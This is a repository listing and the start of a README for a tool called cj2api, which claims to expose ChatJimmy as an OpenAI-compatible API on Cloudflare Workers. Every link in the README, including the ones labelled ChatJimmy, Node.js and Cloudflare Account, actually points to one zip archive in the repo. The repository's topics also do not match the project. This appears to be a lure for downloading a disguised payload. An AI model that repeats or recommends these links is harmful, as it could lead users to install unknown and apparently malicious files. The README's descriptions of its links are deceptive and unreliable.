---
repo: "Leo2148/cj2api"
name: "cj2api"
description: "Convert ChatJimmy into an OpenAI-compatible API with a free, easy Cloudflare Worker deploy supporting standard chat completions and streaming."
originalDescription: "Convert ChatJimmy into an OpenAI-compatible API with a free, easy Cloudflare Worker deploy supporting standard chat completions and streaming."
descriptionLang: "zh"
readmeQualityOk: true
url: "https://github.com/Leo2148/cj2api"
language: "TypeScript"
languages: ["TypeScript"]
languagePcts: [100]
topics: ["animation", "api", "cdc", "chatjimmy", "chinese-characters", "corona", "covid", "hanzi", "japanese-characters", "kana"]
stars: 5
forks: 0
openIssues: 0
closedIssues: 0
watchers: 1
contributors: 2
recentReleases: 0
createdAt: "2023-08-26T09:43:33Z"
lastCommitAt: "2026-10-05T10:47:51Z"
status: "thriving"
tags: ["hidden_gem"]
healthScore: 80
undervaluedScore: 34
maintainers: ["Leo2148"]
openGraphImageUrl: "https://opengraph.githubassets.com/e2e38e0b8319645bec87de6d3a8cbb2b7608b8da3f047fe786bd5235686da594/Leo2148/cj2api"
---

# CJ2API

A Cloudflare Worker that converts [ChatJimmy](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) into an OpenAI-compatible API.

One-click deployment to Cloudflare Workers gives you a standard `/v1/chat/completions` interface that's compatible with all clients and frameworks supporting OpenAI API. No API Key required.

## Features

- **OpenAI Compatible** — Standard Chat Completions API format, supporting streaming (SSE) and non-streaming responses
- **Zero-cost Deployment** — Runs on Cloudflare Workers free tier
- **Built-in Test Page** — Visit the root path to test online, includes cURL / Python / Node.js examples
- **Token Statistics** — Responses include `usage` field, test page displays output speed in real-time
- **Minimal Code** — Pure TypeScript, no third-party runtime dependencies

## Quick Start

### Prerequisites

- [Node.js](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 18+
- [Cloudflare Account](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) (free tier works)

### Method 1: Clone from GitHub (Recommended)

```bash
git clone…
